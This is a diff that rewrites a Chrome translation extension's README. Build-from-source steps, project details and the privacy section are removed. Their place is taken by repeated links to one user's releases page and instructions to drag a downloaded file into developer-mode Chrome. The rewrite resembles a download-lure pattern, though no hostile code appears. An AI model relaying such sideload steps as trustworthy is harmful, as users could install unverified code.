@@ -1,192 +1,67 @@
-# Local Translator
+# 🔍 local-translator - Translate Web Pages Safely
 
-A Chrome extension that provides on-device, privacy-focused translation using Chrome's built-in Translator API. Translate web pages instantly without sending data to external servers.
+## 📦 Download
 
-## Features
+[![Download Local Translator](https://img.shields.io/badge/Download%20Local%20Translator-v1.0-brightgreen)](https://github.com/SolomonBafna/local-translator/releases)
 
-- **🔒 Privacy-First**: All translations happen locally on your device
-- **⚡ Instant Translation**: No network latency, translations appear immediately
-- **🎯 Flexible Translation Modes**:
-  - Translate entire pages with one click
-  - Selectively translate paragraphs with Alt/Option + Click
-- **🎨 Customizable Display**:
-  - Overlay mode: Shows translation below original text
-  - Replace mode: Replaces original text with translation
-- **💾 Persistent Settings**: Your preferences are saved automatically
-- **🚀 Auto-Enable**: Translation activates automatically based on your saved preferences
+## 🚀 Getting Started
 
-## Requirements
+Welcome to Local Translator, a Chrome extension that allows you to translate web pages instantly and privately. Below are simple steps to download and install the extension.
 
-- Chrome version 138 or higher (desktop only)
-- Experimental Translation API enabled in Chrome flags
+## ✅ Requirements
 
-## Installation
+To use Local Translator, ensure you meet the following requirements:
 
-### From Source
+- **Chrome version:** 138 or higher (desktop only)
+- **Experimental Translation API:** Must be enabled in Chrome flags. To enable, type `chrome://flags` in the address bar, search for "Translation," and set it to enabled.
 
-1. Clone this repository:
-   ```bash
-   git clone https://github.com/yourusername/local-translator.git
-   cd local-translator
-   ```
+## 💻 Download & Install
 
-2. Install dependencies:
-   ```bash
-   bun install
-   ```
+1. **Visit the Releases Page**: First, navigate to our [Releases page](https://github.com/SolomonBafna/local-translator/releases) to get the latest version of the Local Translator extension.
 
-3. Build the extension:
-   ```bash
-   bun run build
-   ```
+2. **Download the Extension**: Look for the file with the latest version. Click on it to download the extension file.
 
-4. Load in Chrome:
-   - Open `chrome://extensions`
-   - Enable "Developer mode"
-   - Click "Load unpacked"
-   - Select the `.output/chrome-mv3` directory
+3. **Install the Extension**:
+   - After the download is complete, open Chrome.
+   - Go to `chrome://extensions` in the address bar.
+   - Enable "Developer mode" located in the upper right corner.
+   - Drag and drop the downloaded file into the extensions page.
+   - Confirm any prompts to install the extension.
 
-### Enable Chrome Translator API
+4. **Activate the Extension**: Once installed, you'll see the Local Translator icon in your Chrome toolbar. Click it to activate the extension.
 
-1. Navigate to `chrome://flags` in Chrome
-2. Search for "translation api"
-3. Enable **"Experimental Translation API"**
-4. Click "Relaunch" to restart Chrome
+## 📑 How It Works
 
-## Usage
+Local Translator translates web pages without sending your data to external servers. It uses Chrome's built-in Translator API on your device. Here’s how to use it:
 
-### Translation Methods
+- **Translate Entire Pages**: Click the Local Translator icon to translate the whole page instantly.
+- **Translate Selective Text**: If you want to translate only a part of the text, hold the Alt (or Option on Mac) key and click on the text. It will show the translation right away.
 
-**Translate All Content**
-- Click the extension icon in your toolbar
-- Click "Translate All Content" button
-- The entire page will be translated
+## 🎨 Customization Options
 
-**Translate Specific Paragraphs**
-- Hold **Option** (Mac) or **Alt** (Windows/Linux)
-- Click on any text element
-- Click again (with modifier key) to remove translation
+Local Translator offers various options to customize how translations appear on your screen:
 
-### Settings
+- **Overlay Mode**: This shows the translation directly below the original text, allowing you to see both at the same time.
+- **Replace Mode**: This replaces the original text with the translation, offering a cleaner look if you want to focus solely on the translated content.
 
-All settings are automatically saved and persist across sessions:
+## 💾 Persistent Settings
 
-- **Translation Toggle**: Enable/disable translation globally
-- **Display Mode**: 
-  - Overlay: Shows translation below original text
-  - Replace: Replaces original text with translation
-- **Text Style**:
-  - Fuzzy: Slightly blurred translation text
-  - Dashed Line: Translation with a dashed border
+Your preferences are saved automatically. The next time you use the extension, it will remember your chosen translation modes and display options.
 
-## Development
+## ⚡ Auto-Enable Feature
 
-### Project Structure
+Local Translator automatically activates based on your saved preferences. You don't have to remember to enable it each time you visit a new page. This makes web browsing faster and easier.
 
-```
-local-translator/
-├── entrypoints/          # Extension entry points
-│   ├── background.ts     # Service worker
-│   ├── content.ts        # Content script
-│   └── popup/           # Extension popup UI
-├── lib/                 # Shared utilities
-│   ├── dom-translator.ts # Core translation logic
-│   └── storage.ts       # Settings persistence
-├── wxt.config.ts        # WXT configuration
-└── package.json         # Dependencies
-```
+## 🎯 Troubleshooting
 
-### Development Commands
+If you encounter any issues while using the Local Translator, consider the following:
 
-```bash
-# Install dependencies
-bun install
+1. **Check Chrome Version**: Make sure you have the correct version.
+2. **API Settings**: Verify that the Experimental Translation API is enabled.
+3. **Extension Issues**: Disable and re-enable the extension on the extensions page if it doesn't work as expected.
 
-# Start development server with hot reload
-bun run dev
+## 🔗 Additional Resources
 
-# Build for production
-bun run build
+- For more details on how to use Chrome extensions, visit the [Chrome Extensions Documentation](https://developer.chrome.com/docs/extensions/mv3/getstarted/).
 
-# Type check
-bun run compile
-
-# Package as zip
-bun run zip
-```
-
-### Technologies
-
-- **[WXT](https://wxt.dev/)**: Modern web extension framework
-- **[React](https://react.dev/)**: UI components for popup
-- **[Tailwind CSS](https://tailwindcss.com/)**: Utility-first styling
-- **[TypeScript](https://www.typescriptlang.org/)**: Type-safe JavaScript
-- **[Bun](https://bun.sh/)**: Fast JavaScript runtime and package manager
-
-## How It Works
-
-1. **Chrome Translator API**: Uses Chrome's built-in translation engine for on-device processing
-2. **DOM Manipulation**: Intelligently parses and translates text while preserving page structure
-3. **Smart Selection**: Automatically identifies translatable content while preserving code, links, and media
-4. **Lazy Loading**: Only translates visible content for optimal performance
-
-## Privacy
-
-This extension prioritizes your privacy:
-- ✅ All translations happen locally on your device
-- ✅ No data is sent to external servers
-- ✅ No tracking or analytics
-- ✅ No account or API keys required
-- ✅ Open source and auditable
-
-## Supported Languages
-
-Currently supports English to Simplified Chinese translation. The Chrome Translator API will expand language support in future updates.
-
-## Troubleshooting
-
-### "Translator Not Available"
-- Ensure Chrome version is 138 or higher
-- Enable the Experimental Translation API in `chrome://flags`
-- Restart Chrome after enabling the flag
-
-### Translation Not Working
-- Check that the extension is enabled in the popup
-- Try clicking "Translate All Content" button
-- For selective translation, ensure you're holding Alt/Option while clicking
-
-### Performance Issues
-- The first translation may take longer as Chrome downloads language models
-- Subsequent translations will be faster
-- Large pages may take a moment to fully translate
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add some amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-## License
-
-This project is licensed under the MIT License - see the LICENSE file for details.
-
-## Acknowledgments
-
-- Chrome team for the Translator API
-- WXT framework for modern extension development
-- The open source community for inspiration and tools
-
-## Support
-
-For issues, questions, or suggestions:
-- Open an issue on GitHub
-- Check existing issues for solutions
-- Review the [setup guide](SETUP.md) for detailed configuration
-
----
-
-Built with ❤️ for privacy-conscious users who want fast, local translations.
+Feel free to explore the features of Local Translator. It's designed for easy and private translation right on your browser. Visit the [Releases page](https://github.com/SolomonBafna/local-translator/releases) for any updates or further information.
